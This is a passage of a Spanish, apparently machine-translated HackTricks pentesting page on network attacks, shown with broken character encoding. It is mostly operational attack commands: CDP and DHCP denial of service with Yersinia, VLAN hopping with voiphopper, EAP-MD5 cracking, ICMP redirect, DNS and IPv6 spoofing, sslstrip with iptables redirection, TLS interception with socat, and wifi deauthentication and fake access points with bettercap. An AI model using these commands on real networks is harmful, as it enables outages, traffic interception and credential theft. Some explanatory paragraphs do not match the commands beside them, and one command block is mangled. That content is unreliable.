**Por defecto, el CDP env√≠a anuncios a todos sus puertos.** Pero, ¬øqu√© sucede si un intruso se conecta a un puerto en el mismo switch? Utilizando un sniffer de red, ya sea **Wireshark**, **tcpdump** o **Yersinia**, podr√≠a extraer **informaci√≥n valiosa sobre el propio dispositivo**, desde su modelo hasta la versi√≥n de Cisco IOS. Utilizando esta informaci√≥n, podr√° enumerar la misma versi√≥n de Cisco IOS y encontrar la vulnerabilidad para luego explotarla.

#### Ataque de inundaci√≥n CDP <a href="#0d6a" id="0d6a"></a>

Puede realizar un ataque de denegaci√≥n de servicio (DoS) a un switch CISCO agotando la memoria del dispositivo simulando dispositivos CISCO reales.
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
Selecciona la opci√≥n de **tabla de inundaci√≥n de CDP** y comienza el ataque. La CPU del switch se sobrecargar√°, al igual que la tabla de vecinos de CDP, **resultando en una "par√°lisis de red".**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### Ataque de Impersonaci√≥n de CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Tambi√©n puedes usar [**scapy**](https://github.com/secdev/scapy/). Aseg√∫rate de instalarlo con el paquete `scapy/contrib`.

### Ataques VoIP

Aunque est√°n destinados a ser utilizados por los tel√©fonos de Voz sobre Protocolo de Internet (VoIP) de los empleados, los dispositivos VoIP modernos est√°n cada vez m√°s integrados con dispositivos de IoT. Muchos empleados ahora pueden desbloquear puertas usando un n√∫mero de tel√©fono especial, controlar el termostato de la habitaci√≥n...

La herramienta [**voiphopper**](http://voiphopper.sourceforge.net) imita el comportamiento de un tel√©fono VoIP en entornos de Cisco, Avaya, Nortel y Alcatel-Lucent. Descubre autom√°ticamente el ID de VLAN correcto para la red de voz utilizando uno de los protocolos de descubrimiento de dispositivos que admite, como el Protocolo de Descubrimiento de Cisco (CDP), el Protocolo de Configuraci√≥n Din√°mica de Hosts (DHCP), el Protocolo de Descubrimiento de Capa de Enlace (LLDP-MED) y ARP 802.1Q.

**VoIP Hopper** admite **tres** modos de CDP. El modo **sniff** inspecciona los paquetes de red e intenta localizar el ID de VLAN. Para usarlo, establece el par√°metro **`-c`** en `0`. El modo **spoof** genera paquetes personalizados similares a los que transmitir√≠a un dispositivo VoIP real en la red corporativa. Para usarlo, establece el par√°metro **`-c`** en **`1`**. El modo de spoof con un paquete **pre-madepacket** env√≠a los mismos paquetes que un tel√©fono IP Cisco 7971G-GE. Para usarlo, establece el par√°metro **`-c`** en **`2`**.

Utilizamos el √∫ltimo m√©todo porque es el enfoque m√°s r√°pido. El par√°metro **`-i`** especifica la **interfaz de red** del atacante, y el par√°metro **`-E`** especifica el **nombre del dispositivo VOIP** que se est√° imitando. Elegimos el nombre SEP001EEEEEEEEE, que es compatible con el formato de nomenclatura de Cisco para los tel√©fonos VoIP. El formato consiste en la palabra "SEP" seguida de una direcci√≥n MAC. En entornos corporativos, puedes imitar un dispositivo VoIP existente mirando la etiqueta MAC en la parte posterior del tel√©fono; presionando el bot√≥n de Configuraci√≥n y seleccionando la opci√≥n Informaci√≥n del modelo en la pantalla del tel√©fono; o conectando el cable Ethernet del dispositivo VoIP a tu computadora port√°til y observando las solicitudes CDP del dispositivo utilizando Wireshark.
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
Si la herramienta se ejecuta correctamente, **la red VLAN asignar√° una direcci√≥n IPv4 al dispositivo del atacante**.

### Ataques DHCP

#### Enumeraci√≥n
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Se pueden realizar **dos tipos de DoS** contra servidores DHCP. El primero consiste en **simular suficientes hosts falsos para utilizar todas las posibles direcciones IP**.\
Este ataque solo funcionar√° si puedes ver las respuestas del servidor DHCP y completar el protocolo (**Discover** (Comp) --> **Offer** (servidor) --> **Request** (Comp) --> **ACK** (servidor)). Por ejemplo, esto **no es posible en redes Wifi**.

Otra forma de realizar un DoS de DHCP es enviar un paquete **DHCP-RELEASE utilizando como c√≥digo fuente todas las posibles IP**. Luego, el servidor pensar√° que todos han terminado de usar la IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Una forma m√°s autom√°tica de hacer esto es utilizando la herramienta [DHCPing](https://github.com/kamorin/DHCPig)

Podr√≠as utilizar los ataques de denegaci√≥n de servicio mencionados para forzar a los clientes a obtener nuevas concesiones dentro del entorno y agotar los servidores leg√≠timos para que se vuelvan irresponsivos. Entonces, cuando los leg√≠timos intenten reconectarse, **puedes servir valores maliciosos mencionados en el siguiente ataque**.

#### Establecer valores maliciosos

Puedes utilizar el script DHCP de Responder (_/usr/share/responder/DHCP.py_) para establecer un servidor DHCP falso. Establecer una puerta de enlace maliciosa no es ideal, porque la conexi√≥n secuestrada es solo semid√∫plex (es decir, capturamos los paquetes de salida del cliente, pero no las respuestas de la puerta de enlace leg√≠tima). Por lo tanto, recomendar√≠a establecer un servidor DNS o WPAD falso para capturar el tr√°fico HTTP y las credenciales en particular.

| Descripci√≥n                                 | Ejemplo                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| Nuestra direcci√≥n IP, anunciada como puerta de enlace | _-i 10.0.0.100_                                                              |
| El nombre de dominio DNS local (opcional)        | _-d example.org_                                                             |
| Direcci√≥n IP del enrutador/puerta de enlace original   | _-r 10.0.0.1_                                                                |
| Direcci√≥n IP del servidor DNS primario               | _-p 10.0.0.100_                                                              |
| Direcci√≥n IP del servidor DNS secundario (opcional)  | _-s 10.0.0.1_                                                                |
| La m√°scara de red de la red local            | _-n 255.255.255.0_                                                           |
| La interfaz para escuchar el tr√°fico DHCP      | _-I eth1_                                                                    |
| Direcci√≥n de configuraci√≥n WPAD (URL)            | _-w ‚Äú_[http://10.0.0.100/wpad.dat\n‚Äù](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| Suplantar la direcci√≥n IP de la puerta de enlace predeterminada        | -S                                                                           |
| Responder a todas las solicitudes DHCP (muy ruidoso)   | -R                                                                           |

### **Ataques EAP**

Aqu√≠ hay algunas t√°cticas de ataque que se pueden utilizar contra implementaciones 802.1X:

* Fuerza bruta activa de contrase√±as a trav√©s de EAP
* Atacar el servidor RADIUS con contenido EAP malformado _\*\*_(exploits)
* Captura de mensajes EAP y descifrado offline de contrase√±as (EAP-MD5 y PEAP)
* Forzar la autenticaci√≥n EAP-MD5 para evitar la validaci√≥n del certificado TLS
* Inyectar tr√°fico de red malicioso al autenticar utilizando un concentrador o similar

Si el atacante se encuentra entre la v√≠ctima y el servidor de autenticaci√≥n, podr√≠a intentar degradar (si es necesario) el protocolo de autenticaci√≥n a EAP-MD5 y capturar el intento de autenticaci√≥n. Luego, podr√≠a realizar un ataque de fuerza bruta utilizando:
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### Ataques FHRP (GLBP y HSRP) <a href="#6196" id="6196"></a>

**FHRP** (Protocolo de Redundancia de Primer Salto) es una clase de protocolos de red dise√±ados para **crear un sistema de enrutamiento redundante en caliente**. Con FHRP, los enrutadores f√≠sicos pueden combinarse en un √∫nico dispositivo l√≥gico, lo que aumenta la tolerancia a fallos y ayuda a distribuir la carga.

**Los ingenieros de Cisco Systems han desarrollado dos protocolos FHRP, GLBP y HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Existen tres versiones del Protocolo de Informaci√≥n de Enrutamiento (RIP): RIP, RIPv2 y RIPng. RIP y RIPv2 utilizan datagramas UDP enviados a pares a trav√©s del puerto 520, mientras que RIPng transmite datagramas al puerto UDP 521 a trav√©s de multidifusi√≥n IPv6. RIPv2 introdujo el soporte de autenticaci√≥n MD5. RIPng no incorpora autenticaci√≥n nativa; en su lugar, se basa en las cabeceras opcionales AH y ESP de IPsec dentro de IPv6.

Para obtener m√°s informaci√≥n sobre c√≥mo atacar este protocolo, consulte el libro _**Network Security Assessment: Know Your Network (3rd edition).**_

### Ataques EIGRP

**EIGRP (Protocolo de Enrutamiento Mejorado para Interiores)** es un protocolo de enrutamiento din√°mico. **Es un protocolo de vector de distancia.** Si no hay autenticaci√≥n y configuraci√≥n de interfaces pasivas, un **intruso** puede interferir con el enrutamiento EIGRP y causar **envenenamiento de tablas de enrutamiento**. Adem√°s, la red EIGRP (es decir, el sistema aut√≥nomo) **es plana y no tiene segmentaci√≥n en ninguna zona**. Si un **atacante inyecta una ruta**, es probable que esta ruta se **propague** por todo el sistema aut√≥nomo EIGRP.

Atacar un sistema EIGRP requiere **establecer una vecindad con un enrutador EIGRP leg√≠timo**, lo que abre muchas posibilidades, desde reconocimiento b√°sico hasta diversas inyecciones.

\*\*\*\*[**FRRouting**](https://frrouting.org/) te permite implementar **un enrutador virtual que admite BGP, OSPF, EIGRP, RIP y otros protocolos.** Todo lo que necesitas hacer es implementarlo en el sistema del atacante y puedes fingir ser un enrutador leg√≠timo en el dominio de enrutamiento.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) tambi√©n admite la captura de transmisiones EIGRP y la inyecci√≥n de paquetes para manipular la configuraci√≥n de enrutamiento. Para obtener m√°s informaci√≥n sobre c√≥mo atacarlo con Coly, consulta _**Network Security Assessment: Know Your Network (3rd edition).**_

### OSPF

La mayor√≠a de las implementaciones de Open Shortest Path First (OSPF) utilizan MD5 para proporcionar autenticaci√≥n entre enrutadores. Loki y John the Ripper pueden capturar y atacar hashes MD5 para revelar la clave, que luego se puede utilizar para anunciar nuevas rutas. Los par√°metros de ruta se establecen utilizando la pesta√±a _Injection_, y la clave se establece en _Connection_.

Para obtener m√°s informaci√≥n sobre c√≥mo atacar este protocolo, consulte el libro _**Network Security Assessment: Know Your Network (3rd edition).**_

### Otras Herramientas y Fuentes Gen√©ricas

* [**Above**](https://github.com/c4s73r/Above): Herramienta para escanear el tr√°fico de red y encontrar vulnerabilidades
* Puedes encontrar m√°s informaci√≥n sobre ataques de red [aqu√≠](https://github.com/Sab0tag3d/MITM-cheatsheet). _(TODO: Leer todo y todos los nuevos ataques, si los hay)_

## **Spoofing**

El atacante configura todos los par√°metros de red (GW, IP, DNS) del nuevo miembro de la red enviando respuestas DHCP falsas.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Verifica la [secci√≥n anterior](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste en enviar un paquete ICMP tipo 1 c√≥digo 5 que indica que el atacante es la mejor manera de alcanzar una IP. Luego, cuando la v√≠ctima quiere contactar a la IP, enviar√° el paquete a trav√©s del atacante.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing (Suplantaci√≥n de DNS)

El atacante resolver√° algunos (o todos) los dominios que el usuario solicite.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurar su propio DNS con dnsmasq**

En algunas situaciones de pentesting, puede ser √∫til configurar su propio servidor DNS para realizar pruebas de resoluci√≥n de nombres de dominio. Esto se puede lograr utilizando la herramienta dnsmasq, que es un servidor DNS ligero y f√°cil de configurar.

Dnsmasq se puede instalar en sistemas Linux utilizando el administrador de paquetes de su distribuci√≥n. Una vez instalado, puede configurar el archivo de configuraci√≥n `/etc/dnsmasq.conf` para especificar las reglas de resoluci√≥n de nombres de dominio.

Aqu√≠ hay un ejemplo de configuraci√≥n b√°sica para dnsmasq:

```
# Archivo de configuraci√≥n de dnsmasq

# Escucha en la interfaz de bucle local
listen-address=127.0.0.1

# Resuelve los nombres de dominio de ejemplo.com y *.example.com a la direcci√≥n IP 192.168.1.10
address=/example.com/192.168.1.10

# Resuelve los nombres de dominio de test.com y *.test.com a la direcci√≥n IP 192.168.1.20
address=/test.com/192.168.1.20
```

En este ejemplo, dnsmasq est√° configurado para escuchar en la interfaz de bucle local (127.0.0.1) y resolver los nombres de dominio `example.com` y `test.com` a las direcciones IP especificadas.

Una vez que haya configurado dnsmasq, puede iniciar el servicio utilizando el siguiente comando:

```
sudo systemctl start dnsmasq
```

Despu√©s de iniciar el servicio, puede configurar su sistema para utilizar el servidor DNS local editando el archivo `/etc/resolv.conf` y agregando la siguiente l√≠nea:

```
nameserver 127.0.0.1
```

Ahora, cuando realice pruebas de resoluci√≥n de nombres de dominio en su sistema, dnsmasq responder√° con las direcciones IP especificadas en su archivo de configuraci√≥n.

Recuerde que despu√©s de realizar las pruebas, debe revertir la configuraci√≥n para utilizar el servidor DNS predeterminado de su sistema. Puede hacer esto eliminando la l√≠nea `nameserver 127.0.0.1` del archivo `/etc/resolv.conf` y reiniciando el servicio dnsmasq.

¬°Ahora est√° listo para configurar su propio servidor DNS con dnsmasq y realizar pruebas de resoluci√≥n de nombres de dominio en su entorno de pentesting!
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Pasarelas locales

A menudo existen m√∫ltiples rutas hacia sistemas y redes. Al construir una lista de direcciones MAC dentro de la red local, utiliza _gateway-finder.py_ para identificar hosts que admitan el reenv√≠o de IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Suplantaci√≥n de LLMNR, NBT-NS y mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Los sistemas de Microsoft utilizan Link-Local Multicast Name Resolution (LLMNR) y el servicio de nombres NetBIOS (NBT-NS) para la resoluci√≥n local de hosts cuando las consultas DNS fallan. Las implementaciones de Apple Bonjour y Linux de configuraci√≥n cero utilizan Multicast DNS (mDNS) para descubrir sistemas dentro de una red. Estos protocolos no est√°n autenticados y env√≠an mensajes de difusi√≥n a trav√©s de UDP; por lo tanto, los atacantes pueden aprovecharlos para dirigir a los usuarios a servicios maliciosos.

Puedes suplantar servicios que son buscados por los hosts utilizando Responder para enviar respuestas falsas.\
Lee aqu√≠ m√°s informaci√≥n sobre [c√≥mo suplantar servicios con Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Suplantaci√≥n de WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Muchos navegadores utilizan Web Proxy Auto-Discovery (WPAD) para cargar la configuraci√≥n del proxy desde la red. Un servidor WPAD proporciona la configuraci√≥n del proxy del cliente a trav√©s de una URL espec√≠fica (por ejemplo, [http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)) al ser identificado a trav√©s de cualquiera de los siguientes m√©todos:

* DHCP, utilizando una entrada de c√≥digo 252[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, buscando el nombre de host _wpad_ en el dominio local
* Microsoft LLMNR y NBT-NS (en caso de fallo en la consulta DNS)

Responder automatiza el ataque WPAD, ejecutando un proxy y dirigiendo a los clientes a un servidor WPAD malicioso a trav√©s de DHCP, DNS, LLMNR y NBT-NS.\
Lee aqu√≠ m√°s informaci√≥n sobre [c√≥mo suplantar servicios con Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Suplantaci√≥n de dispositivos SSDP y UPnP](spoofing-ssdp-and-upnp-devices.md)

Puedes ofrecer diferentes servicios en la red para intentar **enga√±ar a un usuario** para que ingrese algunas **credenciales en texto plano**. **M√°s informaci√≥n sobre este ataque en** [**Suplantaci√≥n de dispositivos SSDP y UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Suplantaci√≥n de vecino IPv6

Este ataque es muy similar a la suplantaci√≥n de ARP pero en el mundo IPv6. Puedes hacer que la v√≠ctima piense que la direcci√≥n IPv6 de la puerta de enlace tiene la direcci√≥n MAC del atacante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Suplantaci√≥n/Ataque de Anuncios de Router IPv6

Algunos sistemas operativos configuran de forma predeterminada la puerta de enlace a partir de los paquetes RA enviados en la red. Para declarar al atacante como router IPv6, puedes utilizar:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Suplantaci√≥n de DHCP IPv6

Por defecto, algunos sistemas operativos intentan configurar el DNS leyendo un paquete DHCPv6 en la red. Entonces, un atacante podr√≠a enviar un paquete DHCPv6 para configurarse a s√≠ mismo como DNS. El DHCP tambi√©n proporciona una direcci√≥n IPv6 a la v√≠ctima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (p√°gina falsa e inyecci√≥n de c√≥digo JS)

## Ataques en Internet

### sslStrip

B√°sicamente, lo que hace este ataque es, en caso de que el **usuario** intente **acceder** a una p√°gina **HTTP** que est√° **redirigiendo** a la versi√≥n **HTTPS**, **sslStrip** mantendr√° una **conexi√≥n HTTP con** el **cliente y una conexi√≥n HTTPS con** el **servidor**, de modo que podr√° **interceptar** la conexi√≥n en **texto plano**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
M√°s informaci√≥n [aqu√≠](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ y dns2proxy para evadir HSTS

La **diferencia** entre **sslStrip+ y dns2proxy** en comparaci√≥n con **sslStrip** es que redirigir√°n, por ejemplo, _**www.facebook.com**_ a _**wwww.facebook.com**_ (nota la "**w**" adicional) y establecer√°n la **direcci√≥n de este dominio como la IP del atacante**. De esta manera, el **cliente** se **conectar√°** a _**wwww.facebook.com**_ (el atacante), pero en segundo plano **sslstrip+** mantendr√° la **conexi√≥n real** a trav√©s de HTTPS con **www.facebook.com**.

El **objetivo** de esta t√©cnica es **evitar HSTS** porque _**wwww**.facebook.com_ no se guardar√° en la **cach√©** del navegador, por lo que se enga√±ar√° al navegador para que realice la **autenticaci√≥n de Facebook en HTTP**.\
Ten en cuenta que para llevar a cabo este ataque, la v√≠ctima debe intentar acceder inicialmente a [http://www.faceook.com](http://www.faceook.com) y no a trav√©s de HTTPS. Esto se puede hacer modificando los enlaces dentro de una p√°gina HTTP.

M√°s informaci√≥n [aqu√≠](https://www.bettercap.org/legacy/#hsts-bypass), [aqu√≠](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) y [aqu√≠](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip o sslStrip+ ya no funcionan. Esto se debe a que hay reglas HSTS preguardadas en los navegadores, por lo que incluso si es la primera vez que un usuario accede a un dominio "importante", lo har√° a trav√©s de HTTPS. Adem√°s, ten en cuenta que las reglas preguardadas y otras reglas generadas pueden usar la bandera** [**`includeSubdomains`**](https://hstspreload.appspot.com) **por lo que el ejemplo anterior de** _**wwww.facebook.com**_ **ya no funcionar√°, ya que** _**facebook.com**_ **utiliza HSTS con `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Escucha TCP en el puerto
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## Escucha TCP + SSL en el puerto

#### Generar claves y certificado autofirmado
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Escuchar usando certificado

Cuando se realiza una prueba de penetraci√≥n en una red, es importante poder escuchar el tr√°fico de red para identificar posibles vulnerabilidades. Una forma de hacerlo es utilizando un certificado.

Un certificado es un archivo que contiene informaci√≥n sobre la identidad de una entidad, como una organizaci√≥n o un individuo. En el contexto de la seguridad de la red, un certificado se utiliza para autenticar la identidad de un servidor y cifrar la comunicaci√≥n entre el cliente y el servidor.

Para escuchar el tr√°fico de red utilizando un certificado, se puede utilizar una herramienta como Wireshark. Wireshark es una herramienta de an√°lisis de protocolos de red que permite capturar y analizar el tr√°fico de red en tiempo real.

Para comenzar a escuchar el tr√°fico de red utilizando un certificado en Wireshark, siga los siguientes pasos:

1. Abra Wireshark y seleccione la interfaz de red que desea utilizar para escuchar el tr√°fico.
2. Haga clic en "Capture Options" (Opciones de captura) y seleccione la interfaz de red nuevamente.
3. En la secci√≥n "Capture Filter" (Filtro de captura), ingrese el filtro "tcp port 443" para capturar solo el tr√°fico que utiliza el protocolo TCP en el puerto 443, que es el puerto est√°ndar utilizado para HTTPS.
4. Haga clic en "Start" (Iniciar) para comenzar a capturar el tr√°fico de red.
5. Navegue a un sitio web que utilice HTTPS y observe c√≥mo Wireshark captura el tr√°fico cifrado.
6. Para ver el contenido del tr√°fico cifrado, haga clic con el bot√≥n derecho en uno de los paquetes capturados y seleccione "Follow" (Seguir) y luego "SSL Stream" (Secuencia SSL).

Al escuchar el tr√°fico de red utilizando un certificado, es importante tener en cuenta que esto solo es legal y √©tico si se realiza en un entorno controlado y con el permiso del propietario de la red.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Escuchar usando certificado y redirigir a los hosts

Cuando se realiza una prueba de penetraci√≥n en una red, es importante poder interceptar y escuchar el tr√°fico de red para identificar posibles vulnerabilidades. Una forma de hacer esto es utilizando un certificado para interceptar el tr√°fico HTTPS y redirigirlo a los hosts deseados.

Para lograr esto, se puede utilizar una herramienta como **mitmproxy**. Esta herramienta act√∫a como un proxy y permite interceptar y modificar el tr√°fico de red. Para comenzar, se debe generar un certificado SSL autofirmado que ser√° utilizado por mitmproxy para interceptar el tr√°fico HTTPS.

Una vez que se tiene el certificado, se debe configurar el dispositivo o el navegador para que conf√≠e en el certificado autofirmado. Esto permitir√° que mitmproxy pueda interceptar el tr√°fico HTTPS sin generar advertencias de seguridad.

Una vez que mitmproxy est√° configurado y el certificado es confiable, se puede iniciar la escucha del tr√°fico de red. Mitmproxy mostrar√° todas las solicitudes y respuestas HTTP/HTTPS que pasen a trav√©s de √©l. Esto incluye informaci√≥n sensible como credenciales de inicio de sesi√≥n y datos confidenciales.

Es importante tener en cuenta que el uso de esta t√©cnica puede ser ilegal sin el consentimiento adecuado. Siempre se debe obtener permiso por escrito antes de realizar pruebas de penetraci√≥n en una red.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
A veces, si el cliente verifica que la CA es v√°lida, podr√≠as **servir un certificado de otro nombre de host firmado por una CA**.\
Otra prueba interesante es servir un **certificado del nombre de host solicitado pero autofirmado**.

Otras cosas para probar son intentar firmar el certificado con un certificado v√°lido que no sea una CA v√°lida. O usar la clave p√∫blica v√°lida, forzar el uso de un algoritmo como diffie hellman (uno que no necesite descifrar nada con la clave privada real) y cuando el cliente solicite una prueba de la clave privada real (como un hash), enviar una prueba falsa y esperar que el cliente no lo verifique.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notas de Descubrimiento Activo

Ten en cuenta que cuando se env√≠a un paquete UDP a un dispositivo que no tiene el puerto solicitado, se env√≠a un ICMP (Puerto Inalcanzable).

### **Descubrimiento ARP**

Los paquetes ARP se utilizan para descubrir qu√© IPs se est√°n utilizando dentro de la red. La PC debe enviar una solicitud para cada direcci√≥n IP posible y solo responder√°n las que se est√©n utilizando.

### **mDNS (multicast DNS)**

Bettercap env√≠a una solicitud mDNS (cada X ms) preguntando por **\_services\_.dns-sd.\_udp.local**. La m√°quina que ve este paquete generalmente responde a esta solicitud. Luego, solo busca m√°quinas que respondan a "servicios".

**Herramientas**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (Servidor de Nombres NetBios)**

Bettercap env√≠a paquetes de difusi√≥n al puerto 137/UDP preguntando por el nombre "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Protocolo de Descubrimiento de Servicios Simples)**

Bettercap env√≠a paquetes SSDP de difusi√≥n buscando todo tipo de servicios (Puerto UDP 1900).

### **WSD (Descubrimiento de Servicios Web)**

Bettercap env√≠a paquetes WSD de difusi√≥n buscando servicios (Puerto UDP 3702).

## Referencias

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Consejo de recompensa por errores**: **reg√≠strate** en **Intigriti**, una plataforma premium de **recompensas por errores creada por hackers, para hackers**. ¬°√önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
